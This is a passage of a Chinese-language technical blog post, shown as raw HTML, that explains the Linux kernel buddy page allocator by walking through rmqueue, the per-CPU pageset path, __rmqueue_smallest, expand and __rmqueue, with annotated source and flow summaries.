class="hljs-comment">/* 若该 zone 有 deferred pages，再试一遍 */</span><br><span class="hljs-keyword">if</span> (static_branch_unlikely(&amp;deferred_pages)) &#123;<br><span class="hljs-keyword">if</span> (_deferred_grow_zone(zone, order))<br><span class="hljs-keyword">goto</span> try_this_zone;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 在一台 UMA 机器上可能所以的 zone 都是破碎的，</span><br><span class="hljs-comment"> * 若避免碎片, 重置并重试.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (no_fallback) &#123;<br>alloc_flags &amp;= ~ALLOC_NOFRAGMENT;<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数流程总结如下：</p><ul><li><p><code>for_next_zone_zonelist_nodemask</code> 迭代遍历分配上下文中 zonelist 中的 zoneref 数组 对应的 zone</p><blockquote><p>其核心是单次迭代调用 next_zones_zonelist()，该函数返回:</p><ul><li>在 nodemask 的 zone 中，以当前 zone 作为起点游标的【位于或低于】highest_zoneidx 的下一个 zone</li></ul></blockquote><ul><li><p>若开启了 cpuset，检查当前 zone 是否满足 cpuset 的要求，若否，则尝试下一个 zone</p></li><li><p>检查当前 zone 对应 node 的脏页数量是否超出限制，若否，则尝试下一个 zone</p></li><li><p>若 <code>ALLOC_NOFRAGMENT</code> 但是当前 zone 非 preferred zone、且对应 node 为 remote node，则清除该标志位后<strong>重新开始分配</strong>，因为 locality 比避免碎片更加重要</p></li><li><p>获取当前 zone 的水位线标记</p><ul><li>若是设置了 <code>ALLOC_NO_WATERMARKS</code> 则直接到下一步进行分配</li><li>若水位线检查未通过，调用 <code>node_reclaim()</code> 进行页面回收</li><li>若回收后页面还是不足，则尝试下一个 zone</li></ul></li><li><p>调用 <code>rmqueue()</code> 正式进行内存分配，该函数即为 buddy system 分配算法</p></li></ul></li></ul><p><img src="https://s2.loli.net/2022/07/05/SJMKys31ofnTPXc.png" alt="偷的图.png"></p><h4 id="rmqueue-：从给定的-page-中进行页面分配">rmqueue()：从给定的 page 中进行页面分配</h4><p>该函数定义于 <code>/mm/page_alloc.c</code> 中，主要是从给定 zone 中进行内存分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 从给定 zone 中进行内存分配. 对于 order-0 的分配则使用 pcplists.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span><br><span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">rmqueue</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> zone *preferred_zone,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order,</span><br><span class="hljs-params"><span class="hljs-type">gfp_t</span> gfp_flags, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags,</span><br><span class="hljs-params"><span class="hljs-type">int</span> migratetype)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br><span class="hljs-keyword">if</span> (likely(order == <span class="hljs-number">0</span>)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * MIGRATE_MOVABLE 的 pcplist 可能在 CMA 区域有着页面，</span><br><span class="hljs-comment"> * 当从 CMA 的分配不被允许时我们需要略过它</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">// 对于 order-0 的分配，</span><br>        <span class="hljs-comment">// 若没有开启 CMA | 设置了 ALLOC_CMA | 迁移类型非 MIGRATE_MOVABLE</span><br>        <span class="hljs-comment">// 则先从 pcplist 上分配</span><br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_CMA) || alloc_flags &amp; ALLOC_CMA ||<br>migratetype != MIGRATE_MOVABLE) &#123;<br>page = rmqueue_pcplist(preferred_zone, zone, gfp_flags,<br>migratetype, alloc_flags);<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们绝不希望 callers 尝试</span><br><span class="hljs-comment"> * 在带有 __GFP_NOFAIL 时分配大于 order-1 的页</span><br><span class="hljs-comment"> */</span><br>WARN_ON_ONCE((gfp_flags &amp; __GFP_NOFAIL) &amp;&amp; (order &gt; <span class="hljs-number">1</span>));<br>spin_lock_irqsave(&amp;zone-&gt;lock, flags);<br><br><span class="hljs-keyword">do</span> &#123;<br>page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若由于非CMA的分配上下文导致略过了 pcplist，则order-0 的请求可以到达此处.</span><br><span class="hljs-comment"> * HIGHATOMIC 区域为更高 order 的原子分配所保留，</span><br><span class="hljs-comment"> * 故 order-0 的请求应略过它。</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">// 若 order &gt; 0 且带有 ALLOC_HARDER 标志位，调用 __rmqueue_smallest() 分配</span><br>        <span class="hljs-comment">// 这个标志位意为将水位线减去 1/4，实际上 GFP_ATOMIC 中便会包含该标志位</span><br><span class="hljs-keyword">if</span> (order &gt; <span class="hljs-number">0</span> &amp;&amp; alloc_flags &amp; ALLOC_HARDER) &#123;<br>page = __rmqueue_smallest(zone, order, MIGRATE_HIGHATOMIC);<br><span class="hljs-keyword">if</span> (page)<br>trace_mm_page_alloc_zone_locked(page, order, migratetype);<br>&#125;<br>        <span class="hljs-comment">// 调用 __rmqueue() 进行分配，这个就是真正的核心分配函数了</span><br><span class="hljs-keyword">if</span> (!page)<br>page = __rmqueue(zone, order, migratetype, alloc_flags);<br>&#125; <span class="hljs-keyword">while</span> (page &amp;&amp; check_new_pages(page, order)); <span class="hljs-comment">// 这个检查函数通过了返回false</span><br>spin_unlock(&amp;zone-&gt;lock);<br><span class="hljs-keyword">if</span> (!page)<br><span class="hljs-keyword">goto</span> failed;<br>__mod_zone_freepage_state(zone, -(<span class="hljs-number">1</span> &lt;&lt; order),<br>  get_pcppage_migratetype(page));<br><br>__count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="hljs-number">1</span> &lt;&lt; order);<br>zone_statistics(preferred_zone, zone);<br>local_irq_restore(flags);<br><br>out:<br><span class="hljs-comment">/* Separate test+clear to avoid unnecessary atomics */</span><br><span class="hljs-keyword">if</span> (test_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags)) &#123;<br>clear_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags);<br>wakeup_kswapd(zone, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, zone_idx(zone));<br>&#125;<br><br>VM_BUG_ON_PAGE(page &amp;&amp; bad_range(zone, page), page);<br><span class="hljs-keyword">return</span> page;<br><br>failed:<br>local_irq_restore(flags);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析函数流程前我们先回顾一下这个概念——<code>per-cpu pageset</code> ，这是 zone 上的一个 per-cpu 的页面集，在分配时会优先从这里进行分配</p><p>该函数其实还是对分配的核心逻辑的封装，主要是以下流程：</p><ul><li>分配的 order 为 0，若没有开启 CMA | 设置了 ALLOC_CMA | 迁移类型非 MIGRATE_MOVABLE，则尝试从 per-cpu pageset 中分配并返回</li><li>order &gt; 0，调用 <code>__rmqueue_smallest()</code> 进行页面分配</li><li>之前未分配成功，调用 <code>__rmqueue()</code> 进行页面分配</li><li>结果检查，其中循环内是用 <code>check_new_pages()</code>，未通过则重新循环（回到第二步）</li></ul><h5 id="①-rmqueue-pcplist-：从-per-cpu-pageset-上做-order-0-的分配">① rmqueue_pcplist()：从 per-cpu pageset 上做 order-0 的分配</h5><p>主要是关中断→页面分配→开中断三步走，最后分配调用到的是 <code>__rmqueue_pcplist()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Lock and remove page from the per-cpu list */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">rmqueue_pcplist</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> zone *preferred_zone,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">gfp_t</span> gfp_flags,</span><br><span class="hljs-params"><span class="hljs-type">int</span> migratetype, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pages</span> *<span class="hljs-title">pcp</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">list</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><br>local_irq_save(flags); <span class="hljs-comment">// 关中断</span><br>pcp = &amp;this_cpu_ptr(zone-&gt;pageset)-&gt;pcp;<br><span class="hljs-built_in">list</span> = &amp;pcp-&gt;lists[migratetype]; <span class="hljs-comment">// 获取迁移类型链表</span><br>page = __rmqueue_pcplist(zone,  migratetype, alloc_flags, pcp, <span class="hljs-built_in">list</span>); <span class="hljs-comment">// 分配</span><br><span class="hljs-keyword">if</span> (page) &#123;<br>__count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="hljs-number">1</span>);<br>zone_statistics(preferred_zone, zone);<br>&#125;<br>local_irq_restore(flags); <span class="hljs-comment">// 开中断</span><br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>__rmqueue_pcplist()</code> 主要就是一个大循环，若 pcplist 为空则调用 <code>rmqueue_bulk()</code> 先从 zone 上拿 pages，之后就是简单的链表脱链，分配结果使用 <code>check_new_page()</code> 进行检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 从 per-cpu 链表上取出 page, 调用者必须保护链表 */</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *__<span class="hljs-title">rmqueue_pcplist</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>, <span class="hljs-title">int</span> <span class="hljs-title">migratetype</span>,</span><br><span class="hljs-class"><span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">alloc_flags</span>,</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pages</span> *<span class="hljs-title">pcp</span>,</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">list</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-keyword">if</span> (list_empty(<span class="hljs-built_in">list</span>)) &#123; <span class="hljs-comment">// list 是空的</span><br>            <span class="hljs-comment">// </span><br>pcp-&gt;count += rmqueue_bulk(zone, <span class="hljs-number">0</span>,<br>READ_ONCE(pcp-&gt;batch), <span class="hljs-built_in">list</span>,<br>migratetype, alloc_flags);<br><span class="hljs-keyword">if</span> (unlikely(list_empty(<span class="hljs-built_in">list</span>)))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>        <span class="hljs-comment">// 链表脱链</span><br>page = list_first_entry(<span class="hljs-built_in">list</span>, <span class="hljs-keyword">struct</span> page, lru);<br>list_del(&amp;page-&gt;lru);<br>pcp-&gt;count--;<br>&#125; <span class="hljs-keyword">while</span> (check_new_pcp(page));<br><br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>rmqueue_bulk()</code> 则最终会调用到 <code>__rmqueue()</code> 为 pcplist 进行 <code>pcp-&gt;batch</code> 次的 order-0 的页面分配，并建立链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 为了高效率，从 buddy 分配器获得指定数量的元素, </span><br><span class="hljs-comment"> * 所有的单个元素都在持有锁的情况下进行.  将其添加到提供的链表中.</span><br><span class="hljs-comment"> * 返回放置在 *list 链表上的 pages 数量.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">rmqueue_bulk</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> count, <span class="hljs-keyword">struct</span> list_head *<span class="hljs-built_in">list</span>,</span><br><span class="hljs-params"><span class="hljs-type">int</span> migratetype, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags)</span><br>&#123;<br><span class="hljs-type">int</span> i, alloced = <span class="hljs-number">0</span>;<br><br>spin_lock(&amp;zone-&gt;lock);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; count; ++i) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> __rmqueue(zone, order, migratetype,<br>alloc_flags);<br><span class="hljs-keyword">if</span> (unlikely(page == <span class="hljs-literal">NULL</span>))<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">if</span> (unlikely(check_pcp_refill(page)))<br><span class="hljs-keyword">continue</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 由 expand() 返回的分割 buddy 页面在此处以物理页框顺序接收。</span><br><span class="hljs-comment"> * 页面被添加到 caller 的链表尾部。从 caller 的角度看，链表在</span><br><span class="hljs-comment"> * 某些情况下是按照页码排序的。这对一些可以从头部前向的IO设备是有用的，</span><br><span class="hljs-comment"> * 因为链表也是在物理页的顺序上的。这对于可以在物理页合理排序的情况下</span><br><span class="hljs-comment"> * 合并IO请求的IO设备是有用的。</span><br><span class="hljs-comment"> */</span><br>list_add_tail(&amp;page-&gt;lru, <span class="hljs-built_in">list</span>);<br>alloced++;<br><span class="hljs-keyword">if</span> (is_migrate_cma(get_pcppage_migratetype(page)))<br>__mod_zone_page_state(zone, NR_FREE_CMA_PAGES,<br>      -(<span class="hljs-number">1</span> &lt;&lt; order));<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * i pages were removed from the buddy list even if some leak due</span><br><span class="hljs-comment"> * to check_pcp_refill failing so adjust NR_FREE_PAGES based</span><br><span class="hljs-comment"> * on i. Do not confuse with &#x27;alloced&#x27; which is the number of</span><br><span class="hljs-comment"> * pages added to the pcp list.</span><br><span class="hljs-comment"> */</span><br>__mod_zone_page_state(zone, NR_FREE_PAGES, -(i &lt;&lt; order));<br>spin_unlock(&amp;zone-&gt;lock);<br><span class="hljs-keyword">return</span> alloced;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="②-rmqueue-smallest-：遍历指定-migrationtype-链表的-buddy-算法（核心中的核心）">② __rmqueue_smallest()：遍历指定 migrationtype 链表的 buddy 算法（核心中的核心）</h5><p>我们重新来回顾一下 <code>free_area</code> 的结构，在其中根据迁移类型分成了多个链表：</p><p><img src="https://i.loli.net/2021/11/30/sbNImKo6tBS5GUe.png" alt="自己画的图.png"></p><p>而一个 zone 是由多个 <code>free_area</code> 组成的，一个 <code>free_area</code> 对应一个 order，那么对于该函数而言其只会遍历特定的 order，那么就成了下面的模型：</p><p><img src="https://i.loli.net/2021/11/30/sOwdI5YMNUjLSib.png" alt="自己画的图.png"></p><p>现在我们可以以来看这个函数了：从待分配 order 所对应的 <code>free_area</code> 的指定的 migration type 链表上分配，若不够则一直向更高 order 进行分配后对半向下拆到低 order，这里向更高 order 分配是通过简单的循环 + 链表脱链操作完成的，而拆高阶 page 的操作则是通过 <code>expand()</code> 完成的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 对给定的 migrationtype 遍历 free lists </span><br><span class="hljs-comment"> * 并从 freelists 上移除最小可用的页面</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *__<span class="hljs-title">rmqueue_smallest</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>, <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">order</span>,</span><br><span class="hljs-class"><span class="hljs-title">int</span> <span class="hljs-title">migratetype</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> current_order;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span> *<span class="hljs-title">area</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br><span class="hljs-comment">/* 在 preferred list 上寻找一个合适 size 的 page */</span><br><span class="hljs-keyword">for</span> (current_order = order; current_order &lt; MAX_ORDER; ++current_order) &#123;<br>area = &amp;(zone-&gt;free_area[current_order]);<br>page = get_page_from_free_area(area, migratetype);<br><span class="hljs-keyword">if</span> (!page)<br><span class="hljs-keyword">continue</span>;<br>del_page_from_free_list(page, zone, current_order);<br>expand(zone, page, order, current_order, migratetype);<br>set_pcppage_migratetype(page, migratetype);<br><span class="hljs-keyword">return</span> page;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>expand()</code> 的逻辑就比较简单，从高阶 order 一直循环到待分配的 order：</p><ul><li>首先高阶 order–，之后页面拆两半，把后半部分挂到链表上，前半部分留到下次循环继续拆</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 此处再分割的顺序对 IO subsystem 而言是十分重要的.</span><br><span class="hljs-comment"> * 请不要在有好的理由及回归测试前改变这个顺序。</span><br><span class="hljs-comment"> * 特别地，当大块的内存被分割，更小块（内存）被传递的顺序</span><br><span class="hljs-comment"> * 则由他们在该函数中被分割的顺序决定。</span><br><span class="hljs-comment"> * 根据实际测试，这是影响传递给IO子系统的 pages 顺序的主要因素，</span><br><span class="hljs-comment"> * 考虑到包含一个内存大块（由一系列小的分配作用）的 buddy system 的行为，</span><br><span class="hljs-comment"> * 这也是合理的。这种行为是 sglist 合并成功的关键因素。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * -- nyc</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">expand</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-keyword">struct</span> page *page,</span><br><span class="hljs-params"><span class="hljs-type">int</span> low, <span class="hljs-type">int</span> high, <span class="hljs-type">int</span> migratetype)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> size = <span class="hljs-number">1</span> &lt;&lt; high;<br><br><span class="hljs-keyword">while</span> (high &gt; low) &#123;<br>high--;<br>size &gt;&gt;= <span class="hljs-number">1</span>;<br>VM_BUG_ON_PAGE(bad_range(zone, &amp;page[size]), &amp;page[size]);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 标记为 guard pages (或 page), 这将允许在 buddy 将被</span><br><span class="hljs-comment"> * 释放时合并回分配器.对应的页表项不会被创建，</span><br><span class="hljs-comment"> * pages 在 虚拟地址空间上仍将保持不存在。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (set_page_guard(zone, &amp;page[size], high, migratetype))<br><span class="hljs-keyword">continue</span>;<br><br>add_to_free_list(&amp;page[size], zone, high, migratetype);<br>set_buddy_order(&amp;page[size], high);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="③-rmqueue-：分配封装函数">③ __rmqueue()：分配封装函数</h5><p>这个函数其实主要是对其他分配函数的封装，最终的核心函数其实都还是 <code>__rmqueue_smallest()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 从 buddy allocator 上移除一个元素.</span><br><span class="hljs-comment"> * 在持有 zone-&gt;lock 时调用.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *</span><br><span class="hljs-class">__<span class="hljs-title">rmqueue</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>, <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">order</span>, <span class="hljs-title">int</span> <span class="hljs-title">migratetype</span>,</span><br><span class="hljs-class"><span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">alloc_flags</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_CMA)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 通过当半数空闲内存在 CMA 区域时从 CMA 中分配</span><br><span class="hljs-comment"> * 以平衡常规的与CMA区域的可迁移的分配。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_CMA &amp;&amp;<br>    zone_page_state(zone, NR_FREE_CMA_PAGES) &gt;<br>    zone_page_state(zone, NR_FREE_PAGES) / <span class="hljs-number">2</span>) &#123;<br>page = __rmqueue_cma_fallback(zone, order);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>&#125;<br>retry:<br>page = __rmqueue_smallest(zone, order, migratetype);<br><span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_CMA)<br>page = __rmqueue_cma_fallback(zone, order);<br><br><span class="hljs-keyword">if</span> (!page &amp;&amp; __rmqueue_fallback(zone, order, migratetype,<br>alloc_flags))<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br>out:<br><span class="hljs-keyword">if</span> (page)<br>trace_mm_page_alloc_zone_locked(page, order, migratetype);<br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><p>流程如下：</p><ul><li>若开启了 CMA，比对常规区域与 CMA 区域的空闲页面数量，若 CMA 的多则调用 <code>__rmqueue_cma_fallback()</code> 从 CMA 区域分配（其实就是调用 <code>__rmqueue_smallest()</code> 从迁移类型为 <code>MIGRATE_CMA</code> 的链表上分配），成功则直接返回</li><li>调用 <code>__rmqueue_smallest()</code> 从指定迁移类型链表进行分配，若未成功：<ul><li>若设置了 <code>ALLOC_CMA</code> 的分配 flag，调用 <code>__rmqueue_cma_fallback()</code> 从 CMA 区域进行分配</li><li>若上一步失败则调用 <code>__rmqueue_fallback()</code> 尝试从其他迁移类型链表获取页面，若还是失败则重试这一个大步骤</li></ul></li></ul><h3 